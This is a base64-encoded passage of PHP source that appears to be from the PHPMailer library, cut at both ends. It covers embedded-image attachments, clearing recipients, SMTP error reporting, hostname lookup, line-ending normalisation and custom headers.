D0+ICRkaXNwb3NpdGlvbiwNCiAgICAgICAgICAgIDcgPT4gMA0KICAgICAgICApOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEFkZCBhbiBlbWJlZGRlZCAoaW5saW5lKSBhdHRhY2htZW50IGZyb20gYSBmaWxlLg0KICAgICAqIFRoaXMgY2FuIGluY2x1ZGUgaW1hZ2VzLCBzb3VuZHMsIGFuZCBqdXN0IGFib3V0IGFueSBvdGhlciBkb2N1bWVudCB0eXBlLg0KICAgICAqIFRoZXNlIGRpZmZlciBmcm9tICdyZWd1bGFyJyBhdHRhY2htZW50cyBpbiB0aGF0IHRoZXkgYXJlIGludGVuZGVkIHRvIGJlDQogICAgICogZGlzcGxheWVkIGlubGluZSB3aXRoIHRoZSBtZXNzYWdlLCBub3QganVzdCBhdHRhY2hlZCBmb3IgZG93bmxvYWQuDQogICAgICogVGhpcyBpcyB1c2VkIGluIEhUTUwgbWVzc2FnZXMgdGhhdCBlbWJlZCB0aGUgaW1hZ2VzDQogICAgICogdGhlIEhUTUwgcmVmZXJzIHRvIHVzaW5nIHRoZSAkY2lkIHZhbHVlLg0KICAgICAqIE5ldmVyIHVzZSBhIHVzZXItc3VwcGxpZWQgcGF0aCB0byBhIGZpbGUhDQogICAgICogQHBhcmFtIHN0cmluZyAkcGF0aCBQYXRoIHRvIHRoZSBhdHRhY2htZW50Lg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGNpZCBDb250ZW50IElEIG9mIHRoZSBhdHRhY2htZW50OyBVc2UgdGhpcyB0byByZWZlcmVuY2UNCiAgICAgKiAgICAgICAgdGhlIGNvbnRlbnQgd2hlbiB1c2luZyBhbiBlbWJlZGRlZCBpbWFnZSBpbiBIVE1MLg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJG5hbWUgT3ZlcnJpZGVzIHRoZSBhdHRhY2htZW50IG5hbWUuDQogICAgICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgRmlsZSBlbmNvZGluZyAoc2VlICRFbmNvZGluZykuDQogICAgICogQHBhcmFtIHN0cmluZyAkdHlwZSBGaWxlIE1JTUUgdHlwZS4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRkaXNwb3NpdGlvbiBEaXNwb3NpdGlvbiB0byB1c2UNCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4gVHJ1ZSBvbiBzdWNjZXNzZnVsbHkgYWRkaW5nIGFuIGF0dGFjaG1lbnQNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkRW1iZWRkZWRJbWFnZSgkcGF0aCwgJGNpZCwgJG5hbWUgPSAnJywgJGVuY29kaW5nID0gJ2Jhc2U2NCcsICR0eXBlID0gJycsICRkaXNwb3NpdGlvbiA9ICdpbmxpbmUnKQ0KICAgIHsNCiAgICAgICAgaWYgKCFzZWxmOjppc1Blcm1pdHRlZFBhdGgoJHBhdGgpIG9yICFAaXNfZmlsZSgkcGF0aCkpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkdGhpcy0+bGFuZygnZmlsZV9hY2Nlc3MnKSAuICRwYXRoKTsNCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIElmIGEgTUlNRSB0eXBlIGlzIG5vdCBzcGVjaWZpZWQsIHRyeSB0byB3b3JrIGl0IG91dCBmcm9tIHRoZSBmaWxlIG5hbWUNCiAgICAgICAgaWYgKCR0eXBlID09ICcnKSB7DQogICAgICAgICAgICAkdHlwZSA9IHNlbGY6OmZpbGVuYW1lVG9UeXBlKCRwYXRoKTsNCiAgICAgICAgfQ0KDQogICAgICAgICRmaWxlbmFtZSA9IGJhc2VuYW1lKCRwYXRoKTsNCiAgICAgICAgaWYgKCRuYW1lID09ICcnKSB7DQogICAgICAgICAgICAkbmFtZSA9ICRmaWxlbmFtZTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIEFwcGVuZCB0byAkYXR0YWNobWVudCBhcnJheQ0KICAgICAgICAkdGhpcy0+YXR0YWNobWVudFtdID0gYXJyYXkoDQogICAgICAgICAgICAwID0+ICRwYXRoLA0KICAgICAgICAgICAgMSA9PiAkZmlsZW5hbWUsDQogICAgICAgICAgICAyID0+ICRuYW1lLA0KICAgICAgICAgICAgMyA9PiAkZW5jb2RpbmcsDQogICAgICAgICAgICA0ID0+ICR0eXBlLA0KICAgICAgICAgICAgNSA9PiBmYWxzZSwgLy8gaXNTdHJpbmdBdHRhY2htZW50DQogICAgICAgICAgICA2ID0+ICRkaXNwb3NpdGlvbiwNCiAgICAgICAgICAgIDcgPT4gJGNpZA0KICAgICAgICApOw0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBBZGQgYW4gZW1iZWRkZWQgc3RyaW5naWZpZWQgYXR0YWNobWVudC4NCiAgICAgKiBUaGlzIGNhbiBpbmNsdWRlIGltYWdlcywgc291bmRzLCBhbmQganVzdCBhYm91dCBhbnkgb3RoZXIgZG9jdW1lbnQgdHlwZS4NCiAgICAgKiBCZSBzdXJlIHRvIHNldCB0aGUgJHR5cGUgdG8gYW4gaW1hZ2UgdHlwZSBmb3IgaW1hZ2VzOg0KICAgICAqIEpQRUcgaW1hZ2VzIHVzZSAnaW1hZ2UvanBlZycsIEdJRiB1c2VzICdpbWFnZS9naWYnLCBQTkcgdXNlcyAnaW1hZ2UvcG5nJy4NCiAgICAgKiBAcGFyYW0gc3RyaW5nICRzdHJpbmcgVGhlIGF0dGFjaG1lbnQgYmluYXJ5IGRhdGEuDQogICAgICogQHBhcmFtIHN0cmluZyAkY2lkIENvbnRlbnQgSUQgb2YgdGhlIGF0dGFjaG1lbnQ7IFVzZSB0aGlzIHRvIHJlZmVyZW5jZQ0KICAgICAqICAgICAgICB0aGUgY29udGVudCB3aGVuIHVzaW5nIGFuIGVtYmVkZGVkIGltYWdlIGluIEhUTUwuDQogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZQ0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGVuY29kaW5nIEZpbGUgZW5jb2RpbmcgKHNlZSAkRW5jb2RpbmcpLg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJHR5cGUgTUlNRSB0eXBlLg0KICAgICAqIEBwYXJhbSBzdHJpbmcgJGRpc3Bvc2l0aW9uIERpc3Bvc2l0aW9uIHRvIHVzZQ0KICAgICAqIEByZXR1cm4gYm9vbGVhbiBUcnVlIG9uIHN1Y2Nlc3NmdWxseSBhZGRpbmcgYW4gYXR0YWNobWVudA0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBhZGRTdHJpbmdFbWJlZGRlZEltYWdlKA0KICAgICAgICAkc3RyaW5nLA0KICAgICAgICAkY2lkLA0KICAgICAgICAkbmFtZSA9ICcnLA0KICAgICAgICAkZW5jb2RpbmcgPSAnYmFzZTY0JywNCiAgICAgICAgJHR5cGUgPSAnJywNCiAgICAgICAgJGRpc3Bvc2l0aW9uID0gJ2lubGluZScNCiAgICApIHsNCiAgICAgICAgLy8gSWYgYSBNSU1FIHR5cGUgaXMgbm90IHNwZWNpZmllZCwgdHJ5IHRvIHdvcmsgaXQgb3V0IGZyb20gdGhlIG5hbWUNCiAgICAgICAgaWYgKCR0eXBlID09ICcnIGFuZCAhZW1wdHkoJG5hbWUpKSB7DQogICAgICAgICAgICAkdHlwZSA9IHNlbGY6OmZpbGVuYW1lVG9UeXBlKCRuYW1lKTsNCiAgICAgICAgfQ0KDQogICAgICAgIC8vIEFwcGVuZCB0byAkYXR0YWNobWVudCBhcnJheQ0KICAgICAgICAkdGhpcy0+YXR0YWNobWVudFtdID0gYXJyYXkoDQogICAgICAgICAgICAwID0+ICRzdHJpbmcsDQogICAgICAgICAgICAxID0+ICRuYW1lLA0KICAgICAgICAgICAgMiA9PiAkbmFtZSwNCiAgICAgICAgICAgIDMgPT4gJGVuY29kaW5nLA0KICAgICAgICAgICAgNCA9PiAkdHlwZSwNCiAgICAgICAgICAgIDUgPT4gdHJ1ZSwgLy8gaXNTdHJpbmdBdHRhY2htZW50DQogICAgICAgICAgICA2ID0+ICRkaXNwb3NpdGlvbiwNCiAgICAgICAgICAgIDcgPT4gJGNpZA0KICAgICAgICApOw0KICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBDaGVjayBpZiBhbiBpbmxpbmUgYXR0YWNobWVudCBpcyBwcmVzZW50Lg0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHJldHVybiBib29sZWFuDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGlubGluZUltYWdlRXhpc3RzKCkNCiAgICB7DQogICAgICAgIGZvcmVhY2ggKCR0aGlzLT5hdHRhY2htZW50IGFzICRhdHRhY2htZW50KSB7DQogICAgICAgICAgICBpZiAoJGF0dGFjaG1lbnRbNl0gPT0gJ2lubGluZScpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQ2hlY2sgaWYgYW4gYXR0YWNobWVudCAobm9uLWlubGluZSkgaXMgcHJlc2VudC4NCiAgICAgKiBAcmV0dXJuIGJvb2xlYW4NCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gYXR0YWNobWVudEV4aXN0cygpDQogICAgew0KICAgICAgICBmb3JlYWNoICgkdGhpcy0+YXR0YWNobWVudCBhcyAkYXR0YWNobWVudCkgew0KICAgICAgICAgICAgaWYgKCRhdHRhY2htZW50WzZdID09ICdhdHRhY2htZW50Jykgew0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBDaGVjayBpZiB0aGlzIG1lc3NhZ2UgaGFzIGFuIGFsdGVybmF0aXZlIGJvZHkgc2V0Lg0KICAgICAqIEByZXR1cm4gYm9vbGVhbg0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBhbHRlcm5hdGl2ZUV4aXN0cygpDQogICAgew0KICAgICAgICByZXR1cm4gIWVtcHR5KCR0aGlzLT5BbHRCb2R5KTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBDbGVhciBxdWV1ZWQgYWRkcmVzc2VzIG9mIGdpdmVuIGtpbmQuDQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRraW5kICd0bycsICdjYycsIG9yICdiY2MnDQogICAgICogQHJldHVybiB2b2lkDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyUXVldWVkQWRkcmVzc2VzKCRraW5kKQ0KICAgIHsNCiAgICAgICAgJFJlY2lwaWVudHNRdWV1ZSA9ICR0aGlzLT5SZWNpcGllbnRzUXVldWU7DQogICAgICAgIGZvcmVhY2ggKCRSZWNpcGllbnRzUXVldWUgYXMgJGFkZHJlc3MgPT4gJHBhcmFtcykgew0KICAgICAgICAgICAgaWYgKCRwYXJhbXNbMF0gPT0gJGtpbmQpIHsNCiAgICAgICAgICAgICAgICB1bnNldCgkdGhpcy0+UmVjaXBpZW50c1F1ZXVlWyRhZGRyZXNzXSk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBDbGVhciBhbGwgVG8gcmVjaXBpZW50cy4NCiAgICAgKiBAcmV0dXJuIHZvaWQNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJBZGRyZXNzZXMoKQ0KICAgIHsNCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPnRvIGFzICR0bykgew0KICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJHRvWzBdKV0pOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT50byA9IGFycmF5KCk7DQogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygndG8nKTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBDbGVhciBhbGwgQ0MgcmVjaXBpZW50cy4NCiAgICAgKiBAcmV0dXJuIHZvaWQNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJDQ3MoKQ0KICAgIHsNCiAgICAgICAgZm9yZWFjaCAoJHRoaXMtPmNjIGFzICRjYykgew0KICAgICAgICAgICAgdW5zZXQoJHRoaXMtPmFsbF9yZWNpcGllbnRzW3N0cnRvbG93ZXIoJGNjWzBdKV0pOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5jYyA9IGFycmF5KCk7DQogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygnY2MnKTsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBDbGVhciBhbGwgQkNDIHJlY2lwaWVudHMuDQogICAgICogQHJldHVybiB2b2lkDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQkNDcygpDQogICAgew0KICAgICAgICBmb3JlYWNoICgkdGhpcy0+YmNjIGFzICRiY2MpIHsNCiAgICAgICAgICAgIHVuc2V0KCR0aGlzLT5hbGxfcmVjaXBpZW50c1tzdHJ0b2xvd2VyKCRiY2NbMF0pXSk7DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPmJjYyA9IGFycmF5KCk7DQogICAgICAgICR0aGlzLT5jbGVhclF1ZXVlZEFkZHJlc3NlcygnYmNjJyk7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQ2xlYXIgYWxsIFJlcGx5VG8gcmVjaXBpZW50cy4NCiAgICAgKiBAcmV0dXJuIHZvaWQNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJSZXBseVRvcygpDQogICAgew0KICAgICAgICAkdGhpcy0+UmVwbHlUbyA9IGFycmF5KCk7DQogICAgICAgICR0aGlzLT5SZXBseVRvUXVldWUgPSBhcnJheSgpOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIENsZWFyIGFsbCByZWNpcGllbnQgdHlwZXMuDQogICAgICogQHJldHVybiB2b2lkDQogICAgICovDQogICAgcHVibGljIGZ1bmN0aW9uIGNsZWFyQWxsUmVjaXBpZW50cygpDQogICAgew0KICAgICAgICAkdGhpcy0+dG8gPSBhcnJheSgpOw0KICAgICAgICAkdGhpcy0+Y2MgPSBhcnJheSgpOw0KICAgICAgICAkdGhpcy0+YmNjID0gYXJyYXkoKTsNCiAgICAgICAgJHRoaXMtPmFsbF9yZWNpcGllbnRzID0gYXJyYXkoKTsNCiAgICAgICAgJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSA9IGFycmF5KCk7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQ2xlYXIgYWxsIGZpbGVzeXN0ZW0sIHN0cmluZywgYW5kIGJpbmFyeSBhdHRhY2htZW50cy4NCiAgICAgKiBAcmV0dXJuIHZvaWQNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gY2xlYXJBdHRhY2htZW50cygpDQogICAgew0KICAgICAgICAkdGhpcy0+YXR0YWNobWVudCA9IGFycmF5KCk7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQ2xlYXIgYWxsIGN1c3RvbSBoZWFkZXJzLg0KICAgICAqIEByZXR1cm4gdm9pZA0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBjbGVhckN1c3RvbUhlYWRlcnMoKQ0KICAgIHsNCiAgICAgICAgJHRoaXMtPkN1c3RvbUhlYWRlciA9IGFycmF5KCk7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogQWRkIGFuIGVycm9yIG1lc3NhZ2UgdG8gdGhlIGVycm9yIGNvbnRhaW5lci4NCiAgICAgKiBAYWNjZXNzIHByb3RlY3RlZA0KICAgICAqIEBwYXJhbSBzdHJpbmcgJG1zZw0KICAgICAqIEByZXR1cm4gdm9pZA0KICAgICAqLw0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZXRFcnJvcigkbXNnKQ0KICAgIHsNCiAgICAgICAgJHRoaXMtPmVycm9yX2NvdW50Kys7DQogICAgICAgIGlmICgkdGhpcy0+TWFpbGVyID09ICdzbXRwJyBhbmQgIWlzX251bGwoJHRoaXMtPnNtdHApKSB7DQogICAgICAgICAgICAkbGFzdGVycm9yID0gJHRoaXMtPnNtdHAtPmdldEVycm9yKCk7DQogICAgICAgICAgICBpZiAoIWVtcHR5KCRsYXN0ZXJyb3JbJ2Vycm9yJ10pKSB7DQogICAgICAgICAgICAgICAgJG1zZyAuPSAkdGhpcy0+bGFuZygnc210cF9lcnJvcicpIC4gJGxhc3RlcnJvclsnZXJyb3InXTsNCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRsYXN0ZXJyb3JbJ2RldGFpbCddKSkgew0KICAgICAgICAgICAgICAgICAgICAkbXNnIC49ICcgRGV0YWlsOiAnLiAkbGFzdGVycm9yWydkZXRhaWwnXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkbGFzdGVycm9yWydzbXRwX2NvZGUnXSkpIHsNCiAgICAgICAgICAgICAgICAgICAgJG1zZyAuPSAnIFNNVFAgY29kZTogJyAuICRsYXN0ZXJyb3JbJ3NtdHBfY29kZSddOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoIWVtcHR5KCRsYXN0ZXJyb3JbJ3NtdHBfY29kZV9leCddKSkgew0KICAgICAgICAgICAgICAgICAgICAkbXNnIC49ICcgQWRkaXRpb25hbCBTTVRQIGluZm86ICcgLiAkbGFzdGVycm9yWydzbXRwX2NvZGVfZXgnXTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHRoaXMtPkVycm9ySW5mbyA9ICRtc2c7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogUmV0dXJuIGFuIFJGQyA4MjIgZm9ybWF0dGVkIGRhdGUuDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcmV0dXJuIHN0cmluZw0KICAgICAqIEBzdGF0aWMNCiAgICAgKi8NCiAgICBwdWJsaWMgc3RhdGljIGZ1bmN0aW9uIHJmY0RhdGUoKQ0KICAgIHsNCiAgICAgICAgLy8gU2V0IHRoZSB0aW1lIHpvbmUgdG8gd2hhdGV2ZXIgdGhlIGRlZmF1bHQgaXMgdG8gYXZvaWQgNTAwIGVycm9ycw0KICAgICAgICAvLyBXaWxsIGRlZmF1bHQgdG8gVVRDIGlmIGl0J3Mgbm90IHNldCBwcm9wZXJseSBpbiBwaHAuaW5pDQogICAgICAgIGRhdGVfZGVmYXVsdF90aW1lem9uZV9zZXQoQGRhdGVfZGVmYXVsdF90aW1lem9uZV9nZXQoKSk7DQogICAgICAgIHJldHVybiBkYXRlKCdELCBqIE0gWSBIOmk6cyBPJyk7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogR2V0IHRoZSBzZXJ2ZXIgaG9zdG5hbWUuDQogICAgICogUmV0dXJucyAnbG9jYWxob3N0LmxvY2FsZG9tYWluJyBpZiB1bmtub3duLg0KICAgICAqIEBhY2Nlc3MgcHJvdGVjdGVkDQogICAgICogQHJldHVybiBzdHJpbmcNCiAgICAgKi8NCiAgICBwcm90ZWN0ZWQgZnVuY3Rpb24gc2VydmVySG9zdG5hbWUoKQ0KICAgIHsNCiAgICAgICAgJHJlc3VsdCA9ICdsb2NhbGhvc3QubG9jYWxkb21haW4nOw0KICAgICAgICBpZiAoIWVtcHR5KCR0aGlzLT5Ib3N0bmFtZSkpIHsNCiAgICAgICAgICAgICRyZXN1bHQgPSAkdGhpcy0+SG9zdG5hbWU7DQogICAgICAgIH0gZWxzZWlmIChpc3NldCgkX1NFUlZFUikgYW5kIGFycmF5X2tleV9leGlzdHMoJ1NFUlZFUl9OQU1FJywgJF9TRVJWRVIpIGFuZCAhZW1wdHkoJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10pKSB7DQogICAgICAgICAgICAkcmVzdWx0ID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107DQogICAgICAgIH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ2dldGhvc3RuYW1lJykgJiYgZ2V0aG9zdG5hbWUoKSAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICRyZXN1bHQgPSBnZXRob3N0bmFtZSgpOw0KICAgICAgICB9IGVsc2VpZiAocGhwX3VuYW1lKCduJykgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAkcmVzdWx0ID0gcGhwX3VuYW1lKCduJyk7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRyZXN1bHQ7DQogICAgfQ0KDQogICAgLyoqDQogICAgICogR2V0IGFuIGVycm9yIG1lc3NhZ2UgaW4gdGhlIGN1cnJlbnQgbGFuZ3VhZ2UuDQogICAgICogQGFjY2VzcyBwcm90ZWN0ZWQNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRrZXkNCiAgICAgKiBAcmV0dXJuIHN0cmluZw0KICAgICAqLw0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBsYW5nKCRrZXkpDQogICAgew0KICAgICAgICBpZiAoY291bnQoJHRoaXMtPmxhbmd1YWdlKSA8IDEpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRMYW5ndWFnZSgnZW4nKTsgLy8gc2V0IHRoZSBkZWZhdWx0IGxhbmd1YWdlDQogICAgICAgIH0NCg0KICAgICAgICBpZiAoYXJyYXlfa2V5X2V4aXN0cygka2V5LCAkdGhpcy0+bGFuZ3VhZ2UpKSB7DQogICAgICAgICAgICBpZiAoJGtleSA9PSAnc210cF9jb25uZWN0X2ZhaWxlZCcpIHsNCiAgICAgICAgICAgICAgICAvL0luY2x1ZGUgYSBsaW5rIHRvIHRyb3VibGVzaG9vdGluZyBkb2NzIG9uIFNNVFAgY29ubmVjdGlvbiBmYWlsdXJlDQogICAgICAgICAgICAgICAgLy90aGlzIGlzIGJ5IGZhciB0aGUgYmlnZ2VzdCBjYXVzZSBvZiBzdXBwb3J0IHF1ZXN0aW9ucw0KICAgICAgICAgICAgICAgIC8vYnV0IGl0J3MgdXN1YWxseSBub3QgUEhQTWFpbGVyJ3MgZmF1bHQuDQogICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5sYW5ndWFnZVska2V5XSAuICcgaHR0cHM6Ly9naXRodWIuY29tL1BIUE1haWxlci9QSFBNYWlsZXIvd2lraS9Ucm91Ymxlc2hvb3RpbmcnOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5sYW5ndWFnZVska2V5XTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIC8vUmV0dXJuIHRoZSBrZXkgYXMgYSBmYWxsYmFjaw0KICAgICAgICAgICAgcmV0dXJuICRrZXk7DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBDaGVjayBpZiBhbiBlcnJvciBvY2N1cnJlZC4NCiAgICAgKiBAYWNjZXNzIHB1YmxpYw0KICAgICAqIEByZXR1cm4gYm9vbGVhbiBUcnVlIGlmIGFuIGVycm9yIGRpZCBvY2N1ci4NCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gaXNFcnJvcigpDQogICAgew0KICAgICAgICByZXR1cm4gKCR0aGlzLT5lcnJvcl9jb3VudCA+IDApOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEVuc3VyZSBjb25zaXN0ZW50IGxpbmUgZW5kaW5ncyBpbiBhIHN0cmluZy4NCiAgICAgKiBDaGFuZ2VzIGV2ZXJ5IGVuZCBvZiBsaW5lIGZyb20gQ1JMRiwgQ1Igb3IgTEYgdG8gJHRoaXMtPkxFLg0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHBhcmFtIHN0cmluZyAkc3RyIFN0cmluZyB0byBmaXhFT0wNCiAgICAgKiBAcmV0dXJuIHN0cmluZw0KICAgICAqLw0KICAgIHB1YmxpYyBmdW5jdGlvbiBmaXhFT0woJHN0cikNCiAgICB7DQogICAgICAgIC8vIE5vcm1hbGlzZSB0byANCg0KICAgICAgICAkbnN0ciA9IHN0cl9yZXBsYWNlKGFycmF5KCINCiIsICINCiIpLCAiDQoiLCAkc3RyKTsNCiAgICAgICAgLy8gTm93IGNvbnZlcnQgTEUgYXMgbmVlZGVkDQogICAgICAgIGlmICgkdGhpcy0+TEUgIT09ICINCiIpIHsNCiAgICAgICAgICAgICRuc3RyID0gc3RyX3JlcGxhY2UoIg0KIiwgJHRoaXMtPkxFLCAkbnN0cik7DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRuc3RyOw0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIEFkZCBhIGN1c3RvbSBoZWFkZXIuDQogICAgICogJG5hbWUgdmFsdWUgY2FuIGJlIG92ZXJsb2FkZWQgdG8gY29udGFpbg0KICAgICAqIGJvdGggaGVhZGVyIG5hbWUgYW5kIHZhbHVlIChuYW1lOnZhbHVlKQ0KICAgICAqIEBhY2Nlc3MgcHVibGljDQogICAgICogQHBhcmFtIHN0cmluZyAkbmFtZSBDdXN0b20gaGVhZGVyIG5hbWUNCiAgICAgKiBAcGFyYW0gc3RyaW5nICR2YWx1ZSBIZWFkZXIgdmFsdWUNCiAgICAgKiBAcmV0dXJuIHZvaWQNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gYWRkQ3VzdG9tSGVhZGVyKCRuYW1lLCAkdmFsdWUgPSBudWxsKQ0KICAgIHsNCiAgICAgICAgaWYgKCR2YWx1ZSA9PT0gbnVsbCkgew0KICAgICAgICAgICAgLy8gVmFsdWUgcGFzc2VkIGluIGFzIG5hbWU6dmFsdWUNCiAgICAgICAgICAgICR0aGlzLT5DdXN0b21IZWFkZXJbXSA9IGV4cGxvZGUoJzonLCAkbmFtZSwgMik7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkdGhpcy0+Q3VzdG9tSGVhZGVyW10gPSBhcnJheSgkbmFtZSwgJHZhbHVlKTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIC8qKg0KICAgICAqIFJldHVybnMgYWxsIGN1c3RvbSBoZWFkZXJzLg0KICAgICAqIEByZXR1cm4gYXJyYXkNCiAgICAgKi8NCiAgICBwdWJsaWMgZnVuY3Rpb24gZ2V0Q3VzdG9tSGVhZGVycygpDQogICAgew0KICAgICAgICByZXR1cm4gJHRoaXMtPkN1c3RvbUhlYWRlcjsNCiAgICB9DQoNCiAgICAvKioNCiAgICAgKiBDcmVhdGUgYSBtZXNzYWdlIGJvZHkgZnJvbSBhbiBIVE1MIHN0cmluZy4NCiAgICAgKiBBdXRvbWF0aWNhbGx5IGlubGluZXMgaW1hZ2VzIGFuZCBjcmVhdGVzIGEgcGxhaW4tdGV4dCB2ZXJzaW9uIGJ5IGNvbnZlcnRpbmcgdGhlIEhUTUwsDQogICAgICogb3ZlcndyaXRpbmcgYW55IGV4aXN0aW5nIHZhbHVlcyBpbiBCb2R5IGFuZCBBbHRCb2R5Lg0KICAgICAqIERvIG5vdCBzb3VyY2UgJG1lc3NhZ2UgY29udGVudCBmcm9tIHVzZXIgaW5wdXQhDQogICAgICogJGJhc2VkaXIgaXMgcHJlcGVuZGVkIHdoZW4gaGFuZGxpbmcgcmVsYXRpdmUgVVJMcywgZS5nLiA8aW1nIHNyYz0iL2ltYWdlcy9hLnBuZyI+IGFuZCBtdXN0IG5vdCBiZSBlbXB0eQ0KICAgICAqIHdpbGwgbG9vayBmb3IgYW4gaW1hZ2UgZmlsZSBpbiAkYmFzZWRpci9pbWFnZXMvYS5wbmcgYW5kIGNvbnZlcnQgaXQgdG8gaW5saW5lLg0KICAgICAqIElmIHlvdSBkb24ndCBwcm92aWRlIGEgJGJhc2VkaXIsIHJlbGF0aXZlIHBhdGhzIHdpbGwgYmUgbGVmdCB1bnRvdWNoZWQgKGFuZCB0aHVzIHByb2JhYmx5IGJyZWFrIGluIGVtYWlsKQ0KICAgICAqIElmIHlvdSBkb24ndCB3YW50IHRvIGFwcGx5IHRoZXNlIHRyYW5zZm9ybWF0aW9ucyB0byB5b3VyIEhUTUwsIGp1c3Qgc2V0IEJvZHkgYW5kIEFsdEJvZHkgZGlyZWN0bHkuDQogICAgICogQGFjY2VzcyBwdWJsaWMNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRtZXNzYWdlIEhUTUwgbWVzc2FnZSBzdHJpbmcNCiAgICAgKiBAcGFyYW0gc3RyaW5nICRiYXNlZGlyIEFic29sdXRlIHBhdGggdG8gYSBiYXNlIGRpcmVjdG9yeSB0byBwcmVwZW5kIHRvIHJlbGF0aXZlIHBhdGhzIHRvIGltYWdlcw0KICAgICAqIEBwYXJhbSBib29sZWFufGNhbGxhYmxlICRhZHZhbmNlZCBXaGV0aGVyIHRvIHVzZSB0aGUgaW50ZXJuYWwgSFRNTCB0byB0ZXh0IGNvbnZlcnRlcg0KICAgICAqICAgIG9yIHlvdXIgb3duIGN1c3RvbSBjb252ZXJ0ZXIgQHNlZSBQSFBNYWlsZXI6Omh0bWwydGV4dCgpDQogICAgICogQHJldHVybiBzdHJpbmcgJG1lc3NhZ2UgVGhlIHRyYW5zZm9ybWVkIG1lc3